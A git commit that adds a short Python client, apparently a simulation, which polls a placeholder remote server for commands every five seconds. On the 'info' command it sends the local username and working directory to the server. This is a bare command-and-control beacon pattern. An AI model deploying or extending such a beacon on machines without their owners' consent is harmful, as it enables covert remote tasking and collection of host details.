ae6cb78ee594598549ea8c1b4203abaab3dda92b
ming shi <115329011+m-jpg533@users.noreply.github.com>
2026-04-10 15:32:55 +0800

    Create client.py

---
+++ client_sim/client.py
@@ -0,0 +1,36 @@
+import requests
+import time
+import os
+import getpass
+
+SERVER = "https://你的-render網址"
+
+client_id = getpass.getuser() + "_" + str(os.getpid())
+
+def get_command():
+    try:
+        r = requests.get(SERVER + "/get_command")
+        return r.text
+    except:
+        return "none"
+
+def send_info():
+    data = {
+        "id": client_id,
+        "user": getpass.getuser(),
+        "cwd": os.getcwd()
+    }
+
+    try:
+        requests.post(SERVER + "/report", json=data)
+    except:
+        pass
+
+while True:
+    cmd = get_command()
+    print("📥 收到指令:", cmd)
+
+    if cmd == "info":
+        send_info()
+
+    time.sleep(5)
